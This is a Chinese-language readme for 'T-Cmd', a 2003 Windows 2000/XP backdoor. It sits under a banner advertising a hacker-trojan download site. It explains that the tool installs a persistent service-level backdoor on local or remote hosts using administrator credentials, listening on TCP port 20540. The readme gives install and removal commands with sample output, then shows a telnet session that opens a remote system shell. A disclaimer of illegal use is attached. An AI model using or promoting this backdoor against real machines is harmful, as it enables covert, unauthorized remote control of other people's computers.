┌─────────────────┐
│更多木马软件、工具访问 路捷网络   │
│  本站每天更新   黑客木马工具     │
│     http://soft.98959.com        │
└─────────────────┘
T-Cmd v1.0 beta

Author: TOo2y
E-mail: TOo2y@safechina.net
HomePage: www.safechina.net
Date: 02-05-2003

1>相关简介：

    自动为远程/本地主机创建服务级后门，无须使用任何额外的命令，支持本地/远程模式。重启后，程序仍然自动运行。监听端口20540/tcp。

    远程安装/卸载时，需提供管理员权限(Admin)的用户名及密码，若密码为空，请用"NULL"代替。

    适应平台：Windows2000/XP。

    敬请注意，任何使用本程序做非法用途及相关后果，与本人无关。

    原理与代码参见《浅析Windows2000/XP服务与后门技术》。


2>本地及远程安装/卸载实例：

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

D:\MPJ\CUI\T-Cmd\Debug>T-Cmd -Help

                ---[ T-Cmd v1.0 beta, by TOo2y   ]---
                ---[ E-mail: TOo2y@safechina.net ]---
                ---[ HomePage: www.safechina.net ]---
                ---[ Date: 02-05-2003            ]---

Attention:
  Be careful with this software, Good luck !

Usage Show:
  T-Cmd  -Help
  T-Cmd  -Install  [RemoteHost]  [Account]  [Password]
  T-Cmd  -Remove   [RemoteHost]  [Account]  [Password]

Example:
  T-Cmd  -Install  (Install in the localhost)
  T-Cmd  -Remove   (Remove  in the localhost)
  T-Cmd  -Install  192.168.0.1  TOo2y  123456  (Install in 192.168.0.1)
  T-Cmd  -Remove   192.168.0.1  TOo2y  123456  (Remove  in 192.168.0.1)
  T-Cmd  -Install  192.168.0.2  TOo2y  NULL    (NULL instead of no password)


D:\MPJ\CUI\T-Cmd\Debug>T-Cmd -Install
Transmitting File ... Success !
Creating Service .... Success !
Starting Service .... Pending ... Success !

D:\MPJ\CUI\T-Cmd\Debug>T-Cmd -Remove
Stopping Service .... Pending ... Success !
Removing Service .... Success !
Removing File ....... Success !

D:\MPJ\CUI\T-Cmd\Debug>T-Cmd -Install 192.168.0.1 Administrator NULL
Now Connecting ...... Success !
Transmitting File ... Success !
Creating Service .... Success !
Starting Service .... Pending ... Success !
Now Disconnecting ... Success !

D:\MPJ\CUI\T-Cmd\Debug>T-Cmd -Remove 192.168.0.1 Administrator NULL
Now Connecting ...... Success !
Stopping Service .... Pending ... Success !
Removing Service .... Success !
Removing File ....... Success !
Now Disconnecting ... Success !


3>登录实例：

D:\MPJ\CUI\T-Cmd\Debug>Telnet 192.168.0.1 20540


                ---[ T-Cmd v1.0 beta, by TOo2y   ]---
                ---[ E-mail: TOo2y@safechina.net ]---
                ---[ HomePage: www.safechina.net ]---
                ---[ Date: 02-05-2003            ]---


Escape Character is 'CTRL+]'

Microsoft Windows 2000 [Version 5.00.2195]
(C) 版权所有 1985-1998 Microsoft Corp.

C:\WINNT\system32>